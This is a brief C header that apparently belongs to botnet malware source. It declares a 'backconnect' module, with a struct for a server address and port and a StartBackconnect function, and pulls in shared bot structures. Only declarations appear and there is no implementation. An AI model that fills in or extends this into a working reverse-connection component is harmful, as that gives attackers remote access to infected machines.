#pragma once
#include "modules.h"

#ifdef MODULE_BACKCONNECT
#include "../common/bot_structs.h"

typedef struct
{
	LPSTR pszServerAddress;
	int iPort;
}backconnect_info_t;

BOOL WINAPI StartBackconnect(const LPSTR pszServerAddress, int iPort);
#endif